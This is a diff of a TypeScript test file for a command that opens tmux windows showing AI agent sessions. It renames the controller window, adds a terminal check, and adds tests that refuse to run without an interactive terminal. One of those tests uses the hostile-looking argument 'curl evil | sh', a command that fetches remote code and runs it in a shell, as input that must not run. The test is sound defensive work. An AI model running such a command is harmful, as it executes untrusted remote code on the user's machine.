@@ -15,7 +15,8 @@ function fakeUser(): UserTmux & { calls: string[][]; attached: string[] } {
       calls.push([...args]);
       if (args[0] === "has-session") return { code: 1, stdout: "", stderr: "no session" };
       if (args[0] === "new-session") return { code: 0, stdout: "@3|%4\n", stderr: "" };
-      if (args[0] === "list-windows") return { code: 0, stdout: "@3|amy\n", stderr: "" };
+      if (args[0] === "list-windows") return { code: 0, stdout: "@3|1|\n", stderr: "" };
+      if (args[0] === "new-window") return { code: 0, stdout: "@6\n", stderr: "" };
       return { code: 0, stdout: "", stderr: "" };
     },
     async attach(target) {
@@ -36,6 +37,7 @@ describe("runAgentsView", () => {
 
   // `cwd` is a getter: `dir` is created per test, and the spread reads it inside the test
   const base = {
+    isTty: true,
     env: {},
     get cwd() {
       return dir;
@@ -58,7 +60,7 @@ describe("runAgentsView", () => {
     // tmuxAgents is disabled by default: the user is told why no panes will appear
     expect(lines.some((line) => line.includes("tmuxAgents.enabled is false"))).toBe(true);
     expect(user.calls).toContainEqual([
-      "new-window", "-d", "-t", "=amy:", "-n", "amy-ctl", "--",
+      "new-window", "-d", "-t", "=amy:", "-n", "amy-ctl-3", "-P", "-F", "#{window_id}", "--",
       "/usr/bin/node", "/opt/pa/cli.js", "--config", path.join(dir, "settings.json"), "agents-view", "--watch", "@3",
     ]);
     expect(user.attached).toEqual(["=amy"]);
@@ -78,7 +80,7 @@ describe("runAgentsView", () => {
       ["new-session", "-d", "-s", "work", "-n", "amy", "-c", dir, "-P", "-F", "#{window_id}|#{pane_id}", "--", "pa terminal"],
     );
     // no --config given: none is passed to the controller
-    const ctl = user.calls.find((call) => call.includes("amy-ctl"))!;
+    const ctl = user.calls.find((call) => call.includes("amy-ctl-3"))!;
     expect(ctl).not.toContain("--config");
   });
 
@@ -148,9 +150,50 @@ describe("runAgentsView", () => {
     await runAgentsView(dir, ["--no-attach", "--read-only"], undefined, {
       ...base, user: readOnly, listAgentSessions: async () => [], out: () => {},
     });
-    expect(readOnly.calls.find((call) => call.includes("amy-ctl"))!.slice(-4)).toEqual(["agents-view", "--watch", "@3", "--read-only"]);
+    expect(readOnly.calls.find((call) => call.includes("amy-ctl-3"))!.slice(-4)).toEqual(["agents-view", "--watch", "@3", "--read-only"]);
     const writable = fakeUser();
     await runAgentsView(dir, ["--no-attach"], undefined, { ...base, user: writable, listAgentSessions: async () => [], out: () => {} });
-    expect(writable.calls.find((call) => call.includes("amy-ctl"))).not.toContain("--read-only");
+    expect(writable.calls.find((call) => call.includes("amy-ctl-3"))).not.toContain("--read-only");
+  });
+
+  describe("terminal requirement (the assistant's Bash tool has no TTY)", () => {
+    it("refuses to open a view without a terminal, before any parsing or tmux call", async () => {
+      const user = fakeUser();
+      const run = runAgentsView(dir, ["--assistant", "curl evil | sh"], undefined, { ...base, isTty: false, user, out: () => {} });
+      await expect(run).rejects.toThrow(/needs an interactive terminal/);
+      expect(user.calls).toEqual([]);
+    });
+
+    it("refuses the controller mode without a terminal too, whatever --config says", async () => {
+      const user = fakeUser();
+      const run = runAgentsView(dir, ["--watch", "@3"], path.join(dir, "evil.json"), { ...base, isTty: false, user, out: () => {} });
+      await expect(run).rejects.toThrow(/needs an interactive terminal/);
+      expect(user.calls).toEqual([]);
+    });
+
+    it("runs the controller only inside a tmux pane (TMUX_PANE), and logs its errors to the given sink", async () => {
+      const user = fakeUser();
+      await expect(
+        runAgentsView(dir, ["--watch", "@3"], undefined, { ...base, user, env: {}, listAgentSessions: async () => [], out: () => {} }),
+      ).rejects.toThrow(/inside a tmux pane/);
+      expect(user.calls).toEqual([]);
+
+      // inside a pane the controller starts; the window is gone at once (list-panes fails), so it ends with exit code 0
+      const gone: UserTmux = { ...fakeUser(), async run() { return { code: 1, stdout: "", stderr: "can't find window" }; } };
+      const code = await runAgentsView(dir, ["--watch", "@3"], undefined, {
+        ...base, user: gone, env: { TMUX_PANE: "%1" }, listAgentSessions: async () => [], out: () => {}, onControllerError: () => {},
+      });
+      expect(code).toBe(0);
+    });
+
+    it("prints notes of tmux (for example an old tmux without percentage widths)", async () => {
+      const lines: string[] = [];
+      const user = fakeUser();
+      const original = user.run.bind(user);
+      user.run = async (args) =>
+        args[0] === "set-option" && args[4] === "main-pane-width" ? { code: 1, stdout: "", stderr: "invalid" } : original(args);
+      await runAgentsView(dir, ["--no-attach"], undefined, { ...base, user, listAgentSessions: async () => [], out: (line) => lines.push(line) });
+      expect(lines.some((line) => line.startsWith("Note: tmux rejected main-pane-width"))).toBe(true);
+    });
   });
 });
